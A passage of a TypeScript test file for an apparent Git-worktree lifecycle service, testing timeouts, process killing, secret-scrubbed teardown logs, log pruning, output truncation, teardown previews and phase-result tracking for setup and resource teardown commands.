      it("falls back to child.kill() on Windows when pid is undefined", async () => {
        Object.defineProperty(process, "platform", { value: "win32" });
        vi.useFakeTimers();

        const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
        const child = {
          pid: undefined,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
            listeners[event] ??= [];
            listeners[event].push(cb);
          }),
          kill: vi.fn(),
        };
        mockSpawn.mockReturnValue(child);

        const resultPromise = service.runCommands(["slow-cmd"], {
          cwd: "/test",
          env: {},
          timeoutMs: 1000,
          onProgress: vi.fn(),
        });

        vi.advanceTimersByTime(1001);

        expect(mockTreeKill).not.toHaveBeenCalled();
        expect(child.kill).toHaveBeenCalled();

        listeners["close"]?.forEach((cb) => cb(1));
        await resultPromise;
      });
    });
  });

  describe("teardown log persistence", () => {
    let mockMkdir: ReturnType<typeof vi.fn>;
    let mockReaddir: ReturnType<typeof vi.fn>;
    let mockUnlink: ReturnType<typeof vi.fn>;
    let mockAtomicWrite: ReturnType<typeof vi.fn>;

    beforeEach(async () => {
      const fsModule = await import("fs/promises");
      mockMkdir = vi.mocked(fsModule.mkdir as unknown as () => Promise<undefined>);
      mockReaddir = vi.mocked(fsModule.readdir as unknown as () => Promise<string[]>);
      mockUnlink = vi.mocked(fsModule.unlink as unknown as () => Promise<void>);

      const fsUtilsModule = await import("../../utils/fs.js");
      mockAtomicWrite = vi.mocked(fsUtilsModule.resilientAtomicWriteFile);
      mockAtomicWrite.mockResolvedValue(undefined);
      mockMkdir.mockResolvedValue(undefined);
      mockReaddir.mockResolvedValue([]);
      mockUnlink.mockResolvedValue(undefined);
    });

    function makeOutputProcess(stdout: string, exitCode = 0) {
      const stdoutListeners: ((chunk: Buffer) => void)[] = [];
      const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
      const child = {
        pid: 12345,
        stdout: {
          on: vi.fn((event: string, cb: (chunk: Buffer) => void) => {
            if (event === "data") stdoutListeners.push(cb);
          }),
        },
        stderr: { on: vi.fn() },
        on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
          listeners[event] ??= [];
          listeners[event].push(cb);
        }),
        kill: vi.fn(),
        emit: (event: string, ...args: unknown[]) => {
          listeners[event]?.forEach((cb) => cb(...args));
        },
      };
      setTimeout(() => {
        stdoutListeners.forEach((cb) => cb(Buffer.from(stdout)));
        child.emit("close", exitCode);
      }, 0);
      return child;
    }

    it("does not create or write a log file when logDir is omitted", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("setup output", 0));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
      });

      expect(result.success).toBe(true);
      expect(result.logPath).toBeUndefined();
      expect(mockMkdir).not.toHaveBeenCalled();
      expect(mockAtomicWrite).not.toHaveBeenCalled();
    });

    it("writes a scrubbed full-output log when logDir is provided", async () => {
      const token = "ghp_abcdefghijklmnopqrstuvwxyz0123456789ABCD";
      const stdout = `starting... token=${token} ...done`;
      mockSpawn.mockReturnValue(makeOutputProcess(stdout, 0));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/home/testuser/.daintree/projects/_path_root/teardown-logs/wt-1",
      });

      expect(result.success).toBe(true);
      expect(result.logPath).toBeDefined();
      expect(n(result.logPath ?? "")).toMatch(
        /\/home\/testuser\/\.daintree\/projects\/_path_root\/teardown-logs\/wt-1\/\d+\.log$/
      );
      expect(mockMkdir).toHaveBeenCalledWith(
        "/home/testuser/.daintree/projects/_path_root/teardown-logs/wt-1",
        { recursive: true }
      );
      const writtenContent = mockAtomicWrite.mock.calls[0][1];
      expect(writtenContent).not.toContain(token);
      expect(writtenContent).toContain("[REDACTED]");
      expect(writtenContent).toContain("starting...");
      expect(writtenContent).toContain("...done");
    });

    it("returns undefined logPath when the log write fails (run still succeeds)", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("output", 0));
      mockAtomicWrite.mockRejectedValueOnce(new Error("ENOSPC: no space left"));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(result.success).toBe(true);
      expect(result.logPath).toBeUndefined();
    });

    it("returns undefined logPath when mkdir fails (run still succeeds)", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("output", 0));
      mockMkdir.mockRejectedValueOnce(new Error("EACCES: permission denied"));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(result.success).toBe(true);
      expect(result.logPath).toBeUndefined();
      expect(mockAtomicWrite).not.toHaveBeenCalled();
    });

    it("prunes oldest log files beyond MAX_TEARDOWN_LOGS_PER_WORKTREE", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("output", 0));
      // Simulate 12 existing log files (counting the freshly-written one); the
      // two oldest should be deleted to bring the count back to the cap of 10.
      const existing = Array.from({ length: 12 }, (_, i) => `${1000 + i}.log`);
      mockReaddir.mockResolvedValueOnce(existing);

      await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(mockUnlink).toHaveBeenCalledTimes(2);
      expect(mockUnlink).toHaveBeenNthCalledWith(1, expect.stringMatching(/1000\.log$/));
      expect(mockUnlink).toHaveBeenNthCalledWith(2, expect.stringMatching(/1001\.log$/));
    });

    it("ignores non-.log entries when computing retention", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("output", 0));
      mockReaddir.mockResolvedValueOnce([
        "README.md",
        "1000.log",
        "1001.log",
        "1002.log",
        "spurious.txt",
      ]);

      await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      // Only 3 .log files: under the cap of 10, so nothing is unlinked.
      expect(mockUnlink).not.toHaveBeenCalled();
    });

    it("does not fail the run when readdir-based prune throws", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("output", 0));
      mockReaddir.mockRejectedValueOnce(new Error("EACCES"));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(result.success).toBe(true);
      expect(result.logPath).toBeDefined();
    });

    it("does not fail the run when an individual unlink throws during prune", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("output", 0));
      const existing = Array.from({ length: 12 }, (_, i) => `${1000 + i}.log`);
      mockReaddir.mockResolvedValueOnce(existing);
      mockUnlink.mockRejectedValueOnce(new Error("EBUSY"));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      // Both candidates still attempted even though the first throws.
      expect(mockUnlink).toHaveBeenCalledTimes(2);
      expect(result.success).toBe(true);
      expect(result.logPath).toBeDefined();
    });

    it("includes byte count and log path in the truncation marker when output exceeds the tail cap", async () => {
      const huge = "a".repeat(10_000); // > OUTPUT_TAIL_BYTES (8192)
      mockSpawn.mockReturnValue(makeOutputProcess(huge, 0));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/home/testuser/.daintree/projects/_root/teardown-logs/wt-1",
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain("...(truncated — omitted ");
      expect(result.output).toContain("bytes");
      expect(result.output).toContain(`full log: ${result.logPath}`);
    });

    it("says 'full log unavailable' in the truncation marker when log persistence fails", async () => {
      const huge = "x".repeat(10_000);
      mockSpawn.mockReturnValue(makeOutputProcess(huge, 0));
      mockAtomicWrite.mockRejectedValueOnce(new Error("disk full"));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(result.success).toBe(true);
      expect(result.logPath).toBeUndefined();
      expect(result.output).toContain("...(truncated — omitted ");
      expect(result.output).toContain("full log unavailable");
    });

    it("writes a log on failure paths (non-zero exit) and surfaces logPath", async () => {
      mockSpawn.mockReturnValue(makeOutputProcess("failed output", 1));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(result.success).toBe(false);
      expect(result.logPath).toBeDefined();
      expect(mockAtomicWrite).toHaveBeenCalledTimes(1);
    });

    it("truncates byte-accurately for multibyte UTF-8 content", async () => {
      // 3000 CJK chars × 3 bytes = 9000 bytes, well over OUTPUT_TAIL_BYTES (8192).
      // The char count (3000) is under the threshold; if the guard were
      // char-based the output would not truncate — verifies the byte-correct fix.
      const multibyte = "界".repeat(3000);
      mockSpawn.mockReturnValue(makeOutputProcess(multibyte, 0));

      const result = await service.runCommands(["./run.sh"], {
        cwd: "/test",
        env: {},
        onProgress: vi.fn(),
        logDir: "/some/log/dir",
      });

      expect(result.success).toBe(true);
      expect(result.output).toContain("...(truncated — omitted ");
      // Total 9000 bytes − 8192-byte tail = 808 bytes dropped.
      expect(result.output).toContain("omitted 808 bytes");
    });
  });

  describe("runLifecycleSetup — return value contract", () => {
    function makeFakeMonitor(opts: { worktreeMode?: string } = {}) {
      const status = {
        lifecycleStatus: undefined as unknown,
        hasResourceConfig: false,
      };
      return {
        name: "wt-1",
        branch: "feature/x",
        path: "/wt",
        worktreeMode: opts.worktreeMode ?? "local",
        get hasResourceConfig() {
          return status.hasResourceConfig;
        },
        get lifecycleStatus() {
          return status.lifecycleStatus;
        },
        resourceStatus: undefined,
        setLifecycleStatus(s: unknown) {
          status.lifecycleStatus = s;
        },
        setHasResourceConfig(b: boolean) {
          status.hasResourceConfig = b;
        },
        setHasStatusCommand: vi.fn(),
        setHasPauseCommand: vi.fn(),
        setHasResumeCommand: vi.fn(),
        setHasTeardownCommand: vi.fn(),
        setHasProvisionCommand: vi.fn(),
        setResourceProvider: vi.fn(),
        setResourceConnectCommand: vi.fn(),
        setResourcePollInterval: vi.fn(),
      };
    }

    function makeCtx(monitor: ReturnType<typeof makeFakeMonitor> | null) {
      return {
        projectRootPath: "/root",
        projectEnvVars: {},
        getMonitor: () => (monitor as unknown) ?? undefined,
        emitUpdate: vi.fn(),
      } as unknown as import("../WorktreeLifecycleService.js").WorkspaceHostContext;
    }

    function makeSpawnChild(exitCode: number) {
      return () => {
        const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
        const child = {
          pid: 1234,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
            listeners[event] ??= [];
            listeners[event].push(cb);
            if (event === "close") setTimeout(() => cb(exitCode), 0);
          }),
          kill: vi.fn(),
        };
        return child as never;
      };
    }

    it("returns shouldProvision=true when provisionResource is requested and setup succeeds with provision commands", async () => {
      const config = {
        setup: ["npm install"],
        resource: { provision: ["terraform apply"], connect: "ssh host" },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const monitor = makeFakeMonitor();
      const ctx = makeCtx(monitor);
      const result = await service.runLifecycleSetup("wt-1", "/wt", ctx, true);

      expect(result).toEqual({ shouldProvision: true, needsApproval: false });
    });

    it("returns shouldProvision=false when provisionResource is not requested", async () => {
      const config = {
        setup: ["npm install"],
        resource: { provision: ["terraform apply"] },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const monitor = makeFakeMonitor();
      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), false);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
    });

    it("returns shouldProvision=false when there are no provision commands in the resolved resource", async () => {
      const config = {
        setup: ["npm install"],
        resource: { connect: "ssh host" },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const monitor = makeFakeMonitor();
      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
    });

    it("returns shouldProvision=false when setup commands fail", async () => {
      const config = {
        setup: ["npm install"],
        resource: { provision: ["terraform apply"] },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(1));

      const monitor = makeFakeMonitor();
      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
    });

    it("returns shouldProvision=false when no config exists", async () => {
      mockAccess.mockRejectedValue(new Error("ENOENT"));

      const monitor = makeFakeMonitor();
      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
    });

    it("returns shouldProvision=false when the monitor disappears mid-run (early-exit guard)", async () => {
      const config = {
        setup: ["npm install"],
        resource: { provision: ["terraform apply"] },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(null), true);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
    });

    it("caches resource config on the monitor when there are no setup commands", async () => {
      const config = {
        resource: { provision: ["terraform apply"], connect: "ssh host" },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);

      const monitor = makeFakeMonitor();
      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), false);

      expect(result).toEqual({ shouldProvision: false, needsApproval: false });
      // Resource config IS cached even when setup is empty (no-setup early-return path)
      expect(monitor.hasResourceConfig).toBe(true);
      expect(monitor.setResourceConnectCommand).toHaveBeenCalled();
      // spawn must NOT have been called (no setup commands)
      expect(mockSpawn).not.toHaveBeenCalled();
    });

    it("returns shouldProvision=true when provisionResource=true and provision commands exist even without setup commands", async () => {
      // Config has no `setup` array but has `resource.provision` — the early-return
      // path must still flag for auto-provision so the host can kick off the
      // provision action immediately after creation.
      const config = {
        resource: { provision: ["terraform apply"], connect: "ssh host" },
      };

      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);

      const monitor = makeFakeMonitor();
      const result = await service.runLifecycleSetup("wt-1", "/wt", makeCtx(monitor), true);

      expect(result).toEqual({ shouldProvision: true, needsApproval: false });
      // No spawn should fire — no setup commands to run before provisioning
      expect(mockSpawn).not.toHaveBeenCalled();
    });
  });

  describe("runLifecycleTeardown — log persistence wiring", () => {
    function makeTeardownMonitor(opts: { hasResourceConfig?: boolean } = {}) {
      const statuses: unknown[] = [];
      const phaseResults: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult[] =
        [];
      return {
        name: "wt-1",
        branch: "feature/x",
        path: "/wt",
        worktreeMode: "local",
        hasResourceConfig: opts.hasResourceConfig ?? false,
        get lifecycleStatus() {
          return statuses[statuses.length - 1];
        },
        recordedStatuses: statuses,
        resourceStatus: undefined,
        setLifecycleStatus(s: unknown) {
          statuses.push(s);
        },
        get lifecyclePhaseResults() {
          return phaseResults;
        },
        clearLifecyclePhaseResults() {
          phaseResults.length = 0;
        },
        recordLifecyclePhaseResult(
          r: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult
        ) {
          const idx = phaseResults.findIndex((x) => x.phase === r.phase);
          if (idx >= 0) phaseResults[idx] = r;
          else phaseResults.push(r);
        },
      };
    }

    function makeCtx(monitor: ReturnType<typeof makeTeardownMonitor>) {
      return {
        projectRootPath: "/projects/my-app",
        projectEnvVars: {},
        getMonitor: () => monitor as never,
        emitUpdate: vi.fn(),
      } as unknown as import("../WorktreeLifecycleService.js").WorkspaceHostContext;
    }

    function makeSpawnChild(exitCode: number) {
      return () => {
        const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
        const child = {
          pid: 1234,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
            listeners[event] ??= [];
            listeners[event].push(cb);
            if (event === "close") setTimeout(() => cb(exitCode), 0);
          }),
          kill: vi.fn(),
        };
        return child as never;
      };
    }

    it("propagates logPath into the final teardown lifecycle status", async () => {
      const config = { teardown: ["docker compose down"] };
      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/projects/my-app/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const monitor = makeTeardownMonitor();
      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      const finalStatus = monitor.recordedStatuses.at(-1) as {
        phase: string;
        state: string;
        logPath?: string;
      };
      expect(finalStatus.phase).toBe("teardown");
      expect(finalStatus.state).toBe("success");
      expect(finalStatus.logPath).toBeDefined();
      expect(n(finalStatus.logPath ?? "")).toContain(
        "/home/testuser/.daintree/projects/_projects_my-app/teardown-logs/wt-1/"
      );
      expect(finalStatus.logPath).toMatch(/\d+\.log$/);
    });

    it("previews the teardown a delete would run, in order, without running it", async () => {
      // The delete-confirm dialog names these commands before the user
      // consents, so the preview must come from the same resolution the run
      // uses — and must never itself execute anything.
      const config = {
        resource: { teardown: ["terraform destroy"] },
        teardown: ["docker compose down", "rm -rf .cache"],
      };
      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/projects/my-app/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);

      const monitor = makeTeardownMonitor({ hasResourceConfig: true });
      const preview = await service.previewLifecycleTeardown(monitor as never, makeCtx(monitor));

      expect(mockSpawn).not.toHaveBeenCalled();
      expect(preview.phases.map((p) => [p.phase, p.commands])).toEqual([
        ["resource-teardown", ["terraform destroy"]],
        ["teardown", ["docker compose down", "rm -rf .cache"]],
      ]);

      // Approval as the run sees it: a phase the preview calls approved is one
      // the run executes rather than skipping for approval.
      mockSpawn.mockImplementation(makeSpawnChild(0));
      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));
      for (const phase of preview.phases) {
        const result = monitor.lifecyclePhaseResults.find((r) => r.phase === phase.phase);
        expect(result?.state === "needs-approval").toBe(!phase.approved);
      }
    });

    it("previews no resource phase when the monitor carries no resource config", async () => {
      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/projects/my-app/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(
        JSON.stringify({ resource: { teardown: ["terraform destroy"] } }) as never
      );

      const monitor = makeTeardownMonitor({ hasResourceConfig: false });
      const preview = await service.previewLifecycleTeardown(monitor as never, makeCtx(monitor));
      expect(preview.phases).toEqual([]);
    });

    it("propagates logPath into the resource-teardown lifecycle status", async () => {
      const config = {
        resource: { teardown: ["terraform destroy"] },
      };
      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/projects/my-app/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const monitor = makeTeardownMonitor({ hasResourceConfig: true });
      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      const resourceFinal = monitor.recordedStatuses
        .filter(
          (s): s is { phase: string; state: string; logPath?: string } =>
            typeof s === "object" && s !== null && "phase" in s
        )
        .find((s) => s.phase === "resource-teardown" && s.state !== "running");
      expect(resourceFinal).toBeDefined();
      expect(resourceFinal?.logPath).toBeDefined();
      expect(n(resourceFinal?.logPath ?? "")).toContain(
        "/home/testuser/.daintree/projects/_projects_my-app/teardown-logs/wt-1/"
      );
    });

    it("sanitizes path-unsafe characters in the project root segment", async () => {
      const config = { teardown: ["true"] };
      mockAccess.mockImplementation(async (p: unknown) => {
        // Match the unsanitized path read; the config-lookup helper itself
        // already sanitizes the segment to `_projects_my_app_with_colon` so
        // the access predicate uses that form.
        if (n(p as string).endsWith("/projects/my:app/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(makeSpawnChild(0));

      const monitor = makeTeardownMonitor();
      const ctx = {
        projectRootPath: "/projects/my:app",
        projectEnvVars: {},
        getMonitor: () => monitor as never,
        emitUpdate: vi.fn(),
      } as unknown as import("../WorktreeLifecycleService.js").WorkspaceHostContext;

      await service.runLifecycleTeardown("wt-1", monitor as never, false, ctx);

      const finalStatus = monitor.recordedStatuses.at(-1) as { logPath?: string };
      expect(finalStatus.logPath).toBeDefined();
      // Colon in the path must not appear in the persisted directory.
      expect(finalStatus.logPath).not.toContain("my:app");
      expect(n(finalStatus.logPath ?? "")).toContain("/_projects_my_app/teardown-logs/wt-1/");
    });
  });

  describe("signal capture and abort/timeout markers", () => {
    function makeManualChild(pid: number | undefined = 12345) {
      const listeners: Record<string, ((...args: unknown[]) => void)[]> = {};
      const child = {
        pid,
        stdout: { on: vi.fn() },
        stderr: { on: vi.fn() },
        on: vi.fn((event: string, cb: (...args: unknown[]) => void) => {
          (listeners[event] ??= []).push(cb);
        }),
        kill: vi.fn(),
      };
      const fireClose = (code: number | null, signal?: string) =>
        listeners["close"]?.forEach((cb) => cb(code, signal));
      return { child, fireClose };
    }

    it("captures the OS signal name from the close event (not flattened into exit code)", async () => {
      const { child, fireClose } = makeManualChild();
      mockSpawn.mockReturnValue(child as never);

      const p = service.runCommands(["slow-cmd"], { cwd: "/t", env: {}, onProgress: vi.fn() });
      await Promise.resolve();
      fireClose(null, "SIGTERM");
      const result = await p;

      expect(result.success).toBe(false);
      expect(result.exitCode).toBeNull();
      expect(result.signalName).toBe("SIGTERM");
      expect(result.error).toContain("killed by SIGTERM");
    });

    it("captures exit code with a null signal on a normal non-zero exit", async () => {
      const { child, fireClose } = makeManualChild();
      mockSpawn.mockReturnValue(child as never);

      const p = service.runCommands(["bad-cmd"], { cwd: "/t", env: {}, onProgress: vi.fn() });
      await Promise.resolve();
      fireClose(3);
      const result = await p;

      expect(result.exitCode).toBe(3);
      expect(result.signalName).toBeNull();
      expect(result.error).not.toContain("killed by");
    });

    it("appends a timeout marker to the captured output before killing", async () => {
      vi.useFakeTimers();
      try {
        const { child, fireClose } = makeManualChild();
        mockSpawn.mockReturnValue(child as never);

        const p = service.runCommands(["slow-cmd"], {
          cwd: "/t",
          env: {},
          timeoutMs: 1000,
          onProgress: vi.fn(),
        });
        vi.advanceTimersByTime(1001);
        fireClose(null, "SIGKILL");
        const result = await p;

        expect(result.timedOut).toBe(true);
        expect(result.signalName).toBe("SIGKILL");
        expect(result.output).toContain("[Process timed out after 1000ms");
      } finally {
        vi.useRealTimers();
      }
    });

    it("appends an abort marker to the captured output", async () => {
      const ac = new AbortController();
      const { child, fireClose } = makeManualChild();
      mockSpawn.mockReturnValue(child as never);

      const p = service.runCommands(["slow-cmd"], {
        cwd: "/t",
        env: {},
        signal: ac.signal,
        onProgress: vi.fn(),
      });
      await Promise.resolve();
      ac.abort();
      fireClose(null, "SIGTERM");
      const result = await p;

      expect(result.aborted).toBe(true);
      expect(result.output).toContain("[Process aborted:");
    });
  });

  describe("runLifecycleTeardown — phase result accumulation", () => {
    function makeTeardownMonitor() {
      const phaseResults: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult[] =
        [];
      let lifecycleStatus: unknown;
      return {
        name: "wt-1",
        branch: "feature/x",
        path: "/wt",
        worktreeMode: "local",
        hasResourceConfig: true,
        resourceStatus: undefined,
        get lifecycleStatus() {
          return lifecycleStatus;
        },
        setLifecycleStatus(s: unknown) {
          lifecycleStatus = s;
        },
        get lifecyclePhaseResults() {
          return phaseResults;
        },
        clearLifecyclePhaseResults() {
          phaseResults.length = 0;
        },
        recordLifecyclePhaseResult(
          r: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult
        ) {
          const idx = phaseResults.findIndex((x) => x.phase === r.phase);
          if (idx >= 0) phaseResults[idx] = r;
          else phaseResults.push(r);
        },
      };
    }

    function makeCtx(monitor: ReturnType<typeof makeTeardownMonitor>) {
      return {
        projectRootPath: "/root",
        projectEnvVars: {},
        getMonitor: () => monitor as unknown,
        emitUpdate: vi.fn(),
      } as unknown as import("../WorktreeLifecycleService.js").WorkspaceHostContext;
    }

    it("accumulates both phases without the later phase overwriting the earlier failure", async () => {
      const config = {
        teardown: ["cleanup.sh"],
        resource: { teardown: ["terraform destroy"], provider: "akash" },
      };
      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);

      // First spawn (resource-teardown) fails; second (local teardown) succeeds.
      let call = 0;
      mockSpawn.mockImplementation(() => {
        call++;
        const exit = call === 1 ? 1 : 0;
        const listeners: Record<string, ((...a: unknown[]) => void)[]> = {};
        const child = {
          pid: 1234,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...a: unknown[]) => void) => {
            (listeners[event] ??= []).push(cb);
            if (event === "close") setTimeout(() => cb(exit), 0);
          }),
          kill: vi.fn(),
        };
        return child as never;
      });

      const monitor = makeTeardownMonitor();
      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      const results = monitor.lifecyclePhaseResults;
      expect(results).toHaveLength(2);
      expect(results[0]).toMatchObject({
        phase: "resource-teardown",
        state: "failed",
        category: "billing-critical",
        exitCode: 1,
      });
      expect(results[1]).toMatchObject({
        phase: "teardown",
        state: "success",
        category: "cosmetic",
        exitCode: 0,
      });
    });

    it("records only the billing-critical phase for a resource-only teardown", async () => {
      const config = { resource: { teardown: ["terraform destroy"], provider: "akash" } };
      mockAccess.mockImplementation(async (p: unknown) => {
        if (n(p as string).endsWith("/root/.daintree/config.json")) return undefined;
        throw new Error("ENOENT");
      });
      mockReadFile.mockResolvedValue(JSON.stringify(config) as never);
      mockSpawn.mockImplementation(() => {
        const listeners: Record<string, ((...a: unknown[]) => void)[]> = {};
        const child = {
          pid: 1234,
          stdout: { on: vi.fn() },
          stderr: { on: vi.fn() },
          on: vi.fn((event: string, cb: (...a: unknown[]) => void) => {
            (listeners[event] ??= []).push(cb);
            if (event === "close") setTimeout(() => cb(0), 0);
          }),
          kill: vi.fn(),
        };
        return child as never;
      });

      const monitor = makeTeardownMonitor();
      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      const results = monitor.lifecyclePhaseResults;
      expect(results).toHaveLength(1);
      expect(results[0]).toMatchObject({
        phase: "resource-teardown",
        category: "billing-critical",
      });
    });

    it("clears stale results when a re-invocation has no teardown configured", async () => {
      const monitor = makeTeardownMonitor();
      monitor.recordLifecyclePhaseResult({
        phase: "resource-teardown",
        state: "failed",
        category: "billing-critical",
        exitCode: 1,
        signalName: null,
        startedAt: 1,
        completedAt: 2,
      });

      // No config file exists this time → early-return path.
      mockAccess.mockRejectedValue(new Error("ENOENT"));

      await service.runLifecycleTeardown("wt-1", monitor as never, false, makeCtx(monitor));

      expect(monitor.lifecyclePhaseResults).toHaveLength(0);
    });
  });

  describe("repository command approval", () => {
    const ROOT = "/root";
    const WT = "/wt";
    let approved: Set<string>;

    function makeMonitor(opts: { hasResourceConfig?: boolean; worktreeMode?: string } = {}) {
      const statuses: Array<{ phase: string; state: string; error?: string }> = [];
      const phaseResults: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult[] =
        [];
      const monitor = {
        name: "wt-1",
        branch: "feature/x",
        path: WT,
        worktreeMode: opts.worktreeMode ?? "local",
        hasResourceConfig: opts.hasResourceConfig ?? false,
        resourceStatus: undefined,
        statuses,
        needsApproval: undefined as boolean | undefined,
        get lifecycleStatus() {
          return statuses.at(-1);
        },
        setLifecycleStatus(status: { phase: string; state: string }) {
          statuses.push(status);
        },
        get lifecyclePhaseResults() {
          return phaseResults;
        },
        clearLifecyclePhaseResults() {
          phaseResults.length = 0;
        },
        recordLifecyclePhaseResult(
          r: import("../../../shared/types/worktree.js").WorktreeLifecyclePhaseResult
        ) {
          phaseResults.push(r);
        },
        setLifecycleCommandsNeedApproval(value: boolean) {
          monitor.needsApproval = value;
        },
        setHasResourceConfig(value: boolean) {
          monitor.hasResourceConfig = value;
        },
        setHasStatusCommand: vi.fn(),
        setHasPauseCommand: vi.fn(),
        setHasResumeCommand: vi.fn(),
        setHasTeardownCommand: vi.fn(),
        setHasProvisionCommand: vi.fn(),
        setResourceProvider: vi.fn(),
